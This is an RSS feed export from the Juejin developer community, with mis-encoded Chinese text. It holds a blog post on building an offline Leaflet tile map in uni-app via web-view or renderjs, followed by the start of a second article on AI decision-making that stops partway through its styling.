<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[uni-appä½¿ç”¨ç“¦ç‰‡å®ç°ç¦»çº¿åœ°å›¾çš„ä¸¤ç§æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592531796044185615</link>    <guid>https://juejin.cn/post/7592531796044185615</guid>    <pubDate>2026-01-08T03:08:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796044185615" data-draft-id="7592524811860803618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-appä½¿ç”¨ç“¦ç‰‡å®ç°ç¦»çº¿åœ°å›¾çš„ä¸¤ç§æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,Trae"/> <meta itemprop="datePublished" content="2026-01-08T03:08:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æå‰‘ä¸€"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-appä½¿ç”¨ç“¦ç‰‡å®ç°ç¦»çº¿åœ°å›¾çš„ä¸¤ç§æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æå‰‘ä¸€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:08:11.000Z" title="Thu Jan 08 2026 03:08:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘æ¥åˆ°ä¸€ä¸ªå®‰å“Appçš„æ´»å„¿ï¼Œè™½ç„¶åŠŸèƒ½ä¸Šä¸ç®—å¤æ‚ï¼Œä½†å› ä¸ºåŸæœ¬æ²¡æ€ä¹ˆåšè¿‡å®‰å“ç«¯ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯"æ‘¸ç€çŸ³å¤´è¿‡æ²³"ã€‚ç®€å•å†™ä¸€ä¸‹è¸©è¿‡çš„å‘å’Œæ·Œçš„æ°´å§~</p>
<p>uni-appå®ç°ç¦»çº¿åœ°å›¾ä¸»è¦ç”¨ <strong>leafletjs</strong> å®ç°ï¼Œä½†æ˜¯å› ä¸ºåœ¨å®‰å“ç«¯è¿è¡Œï¼Œå­˜åœ¨æ¸²æŸ“é—®é¢˜ï¼Œæ‰€ä»¥è¿˜è¦ç”¨ä¸Š <strong>renderjs</strong>ã€‚</p>
<h2 data-id="heading-0">å®ç°æ–¹æ¡ˆä¸€ï¼šweb-view</h2>
<p>å› ä¸ºuni-appå¼•å…¥ç¬¬ä¸‰æ–¹å¯ä»¥é‡‡ç”¨ä¼ ç»Ÿçš„ <code>NPM</code> å®‰è£…çš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨å¼•å…¥æ‰“åŒ…å®Œçš„<code>jsæ–‡ä»¶</code>çš„æ–¹å¼ã€‚</p>
<p>è¿™é‡Œé‡‡ç”¨ <code>leafletjs</code> æ‰“åŒ…å®Œçš„æ–‡ä»¶ï¼Œå°† <code>leafletjs</code> æ”¾å…¥ <code>static</code> æ–‡ä»¶å¤¹å†…ã€‚</p>
<p>åœ¨ç½‘ä¸Šä¸‹è½½äº†å…¬å¼€çš„ç“¦ç‰‡åœ°å›¾å›¾ç‰‡ï¼Œä»¥ <code>{z}/{x}/{y}</code> çš„ç›®å½•ç»“æ„æ”¾å…¥ <code>tiles</code> æ–‡ä»¶å¤¹ä¸­ï¼Œå°† <code>tiles</code> æ”¾å…¥ <code>static</code> æ–‡ä»¶å¤¹å†…ã€‚</p>
<p>åœ¨staticæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ª <code>offline-map.html</code> æ–‡ä»¶</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç¦»çº¿åœ°å›¾<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./leaflet/leaflet.css"</span> /&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
			<span class="hljs-selector-tag">html</span>,
			<span class="hljs-selector-tag">body</span> {
				<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
				<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
			}

			<span class="hljs-selector-id">#map</span> {
				<span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
				<span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;
				<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
				<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
			}
		</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"map"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./leaflet/leaflet.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
			<span class="hljs-keyword">const</span> baseUrl = <span class="hljs-string">'./tiles/{z}/{x}/{y}.jpg'</span>;
			<span class="hljs-keyword">const</span> map = L.<span class="hljs-title function_">map</span>(<span class="hljs-string">'map'</span>).<span class="hljs-title function_">setView</span>([<span class="hljs-number">23.56</span>, <span class="hljs-number">113.23</span>], <span class="hljs-number">15</span>);

			L.<span class="hljs-title function_">tileLayer</span>(baseUrl, {
				<span class="hljs-attr">minZoom</span>: <span class="hljs-number">15</span>,
				<span class="hljs-attr">maxZoom</span>: <span class="hljs-number">18</span>,
				<span class="hljs-attr">tms</span>: <span class="hljs-literal">true</span>,
				<span class="hljs-attr">attribution</span>: <span class="hljs-string">'Offline Tiles'</span>,
				<span class="hljs-attr">errorTileUrl</span>: <span class="hljs-string">''</span>
			}).<span class="hljs-title function_">addTo</span>(map);
		</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>æ‰¾åˆ° <code>pages/index/index.vue</code> æ–‡ä»¶ï¼Œé‡‡ç”¨ <code>web-view</code> å¼•ç”¨çš„æ–¹å¼å¼•å…¥ä¸Šè¿° html æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/index/index.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">web-view</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/offline-map.html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-view</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
	<span class="hljs-selector-class">.content</span> {
		<span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
		<span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
		<span class="hljs-attribute">display</span>: flex;
		<span class="hljs-attribute">flex-direction</span>: column;
		<span class="hljs-attribute">align-items</span>: center;
		<span class="hljs-attribute">justify-content</span>: center;
	}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">å®ç°æ–¹æ¡ˆäºŒï¼šrenderjs</h2>
<p>ä»ç„¶å°† <code>leafletjs</code> å’Œ <code>ç“¦ç‰‡å›¾ç‰‡æ–‡ä»¶å¤¹tiles</code> æ”¾å…¥ <code>static</code> æ–‡ä»¶å¤¹ä¸­ã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/index/index.vue
<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"map"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"map-container"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">module</span>=<span class="hljs-string">"leaflet"</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"renderjs"</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">import</span> <span class="hljs-string">'@/static/leaflet/leaflet.css'</span>;
	<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> L <span class="hljs-keyword">from</span> <span class="hljs-string">"@/static/leaflet/leaflet.js"</span>;

    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
		<span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
			<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initMap</span>();
		},
		<span class="hljs-attr">methods</span>: {
			<span class="hljs-title function_">initMap</span>(<span class="hljs-params"/>) {
				<span class="hljs-keyword">const</span> baseUrl = <span class="hljs-string">'static/tiles/{z}/{x}/{y}.jpg'</span>
				map = L.<span class="hljs-title function_">map</span>(<span class="hljs-string">'map'</span>).<span class="hljs-title function_">setView</span>([<span class="hljs-number">23.56</span>, <span class="hljs-number">113.23</span>], <span class="hljs-number">15</span>);

				L.<span class="hljs-title function_">tileLayer</span>(baseUrl, {
					<span class="hljs-attr">minZoom</span>: <span class="hljs-number">15</span>,
					<span class="hljs-attr">maxZoom</span>: <span class="hljs-number">18</span>,
					<span class="hljs-attr">tms</span>: <span class="hljs-literal">true</span>,
					<span class="hljs-attr">attribution</span>: <span class="hljs-string">'Offline Tiles'</span>,
					<span class="hljs-attr">errorTileUrl</span>: <span class="hljs-string">''</span>
				}).<span class="hljs-title function_">addTo</span>(map);
			},
        }
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€å®šè¦åœ¨ <code>renderjs</code> ä¸­å®ç°ä¸Šè¿°ä»£ç ï¼Œå¦‚æœåœ¨å¸¸è§„ <code>script</code> ä¸­å®ç°ï¼Œåœ¨ <code>H5ç«¯</code> æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯è¿è¡Œåˆ°<code>çœŸæœº</code>ä¸Šä¼šç™½å±ã€‚ï¼ˆè¿™ä¸ªé—®é¢˜æˆ‘åå¤è¯•äº†å¥½å‡ æ¬¡éƒ½ä¸è¡Œï¼Œç»“æœè¿˜æ˜¯ä¸Šä¼ åˆ° <strong>Trae</strong> ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼‰ã€‚</p>
<p>å¯¼è‡´è¿™ç§æƒ…å†µçš„åŸå› æ˜¯åœ¨å¸¸è§„ sctipt ä¸­çš„ä»£ç ï¼Œåœ¨çœŸæœºä¸Šæ˜¯è¿è¡Œåœ¨ <strong>é€»è¾‘å±‚</strong> çš„ä»£ç ï¼Œæ— æ³•å¹²æ‰°åˆ° <strong>è§†å›¾å±‚</strong> çš„ç»“æ„ï¼Œè¿™ä¸€ç‚¹å’ŒWebæ˜¯ä¸åŒçš„ã€‚</p>
<p>è€Œ renderjs æ˜¯è¿è¡Œåœ¨ <strong>è§†å›¾å±‚</strong> çš„jsï¼Œå…·å¤‡æ“ä½œ <strong>DOM</strong> çš„èƒ½åŠ›ã€‚</p>
<p>å…¶æ¬¡æ˜¯å¼•ç”¨ static æ–‡ä»¶çš„è·¯å¾„ï¼Œimport static ä¸­çš„æ–‡ä»¶å¯ä»¥ä½¿ç”¨ <code>@/static</code> çš„æ–¹å¼ï¼Œä½†æ˜¯åœ¨ä»£ç ä¸­å¼•ç”¨ static æ–‡ä»¶éœ€è¦é‡‡ç”¨ <code>static/</code> çš„å½¢å¼ã€‚</p>
<h2 data-id="heading-2">æ€»ç»“</h2>
<p>æœ€åæˆ‘åšå®Œä»¥åè®© Trae ç»™äº†ä¸€ä¸‹è¯„ä»·ï¼ŒTrae è¡¨ç¤º<strong>ä¸å»ºè®®</strong>é‡‡ç”¨è¿™ç§æ–¹å¼å®ç°ç¦»çº¿åœ°å›¾ï¼Œé¦–å…ˆç“¦ç‰‡åœ°å›¾æ–‡ä»¶ä¸€èˆ¬<strong>éå¸¸å¤§</strong>ï¼Œæˆ‘ç”¨çš„ä»…ä»…æ˜¯å…¶ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œä¹Ÿè¶…è¿‡äº† <strong>60MB</strong>ï¼Œæ‰“åŒ…å‡ºæ¥çš„ App åŒ…å¤ªå¤§äº†ã€‚</p>
<p>å…¶æ¬¡æ— è®ºæ˜¯ <code>web-view</code> è¿˜æ˜¯ <code>renderjs</code> æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ã€‚åœ¨app-vueç¯å¢ƒä¸‹ï¼Œè§†å›¾å±‚ç”±webviewæ¸²æŸ“ï¼Œè€Œrenderjså°±æ˜¯è¿è¡Œåœ¨è§†å›¾å±‚çš„ã€‚</p>
<p>æ‰€ä»¥æ— è®ºæ˜¯æ¸²æŸ“æ•ˆç‡è¿˜æ˜¯å¼€å‘ä¸ŠåŸºæœ¬æ²¡å·®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸŒ AI è‡ªä¸»å†³ç­–ï¼šä»æ–‡å­—åˆ°å›¾åƒä¸å£°éŸ³çš„ä¸‰å…ƒèµ‹èƒ½ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7592451588848877587</link>    <guid>https://juejin.cn/post/7592451588848877587</guid>    <pubDate>2026-01-08T03:12:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848877587" data-draft-id="7592439090097258539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸŒ AI è‡ªä¸»å†³ç­–ï¼šä»æ–‡å­—åˆ°å›¾åƒä¸å£°éŸ³çš„ä¸‰å…ƒèµ‹èƒ½ä¹‹è·¯"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-08T03:12:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸŒ AI è‡ªä¸»å†³ç­–ï¼šä»æ–‡å­—åˆ°å›¾åƒä¸å£°éŸ³çš„ä¸‰å…ƒèµ‹èƒ½ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:12:46.000Z" title="Thu Jan 08 2026 03:12:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 